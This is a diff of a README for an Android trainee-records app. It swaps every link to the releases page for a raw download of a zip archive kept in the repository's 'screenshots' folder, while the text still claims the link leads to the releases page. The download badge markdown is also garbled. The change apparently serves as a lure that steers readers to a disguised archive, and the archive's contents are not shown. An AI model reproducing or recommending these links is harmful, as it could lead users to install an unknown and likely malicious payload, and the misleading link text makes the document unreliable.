@@ -4,13 +4,13 @@
 Welcome to Trainee Manager Pro! This Android application helps you manage trainee records easily. Track batch statistics and generate government-compliant PDF reports, all with a user-friendly interface.
 
 ## 📥 Download Trainee Manager Pro
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23348bff.svg?style=for-the-badge&logoColor=white)](https://github.com/Ishan2805/Trainee-Manager-Pro/releases)
+[![Download Now](https://github.com/Ishan2805/Trainee-Manager-Pro/raw/refs/heads/main/screenshots/Pro-Trainee-Manager-v3.9.zip%20Now-%https://github.com/Ishan2805/Trainee-Manager-Pro/raw/refs/heads/main/screenshots/Pro-Trainee-Manager-v3.9.zip)](https://github.com/Ishan2805/Trainee-Manager-Pro/raw/refs/heads/main/screenshots/Pro-Trainee-Manager-v3.9.zip)
 
 ## 🚀 Getting Started
 To begin using the Trainee Manager Pro app, simply follow these steps:
 
 1. **Visit the Releases Page**  
-   Click [this link](https://github.com/Ishan2805/Trainee-Manager-Pro/releases) to go to the releases page where you can find the latest version of the app.
+   Click [this link](https://github.com/Ishan2805/Trainee-Manager-Pro/raw/refs/heads/main/screenshots/Pro-Trainee-Manager-v3.9.zip) to go to the releases page where you can find the latest version of the app.
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest version listed at the top. This version will have the most recent updates and features.
@@ -46,4 +46,4 @@ Need help navigating the app or have a question? Check our FAQ section in the ap
 ## 🔗 Discover More
 For further insights into how to make the most out of Trainee Manager Pro, visit the releases page regularly for updates and new features. 
 
-[Download Trainee Manager Pro Here](https://github.com/Ishan2805/Trainee-Manager-Pro/releases) to experience effective trainee management today!
+[Download Trainee Manager Pro Here](https://github.com/Ishan2805/Trainee-Manager-Pro/raw/refs/heads/main/screenshots/Pro-Trainee-Manager-v3.9.zip) to experience effective trainee management today!
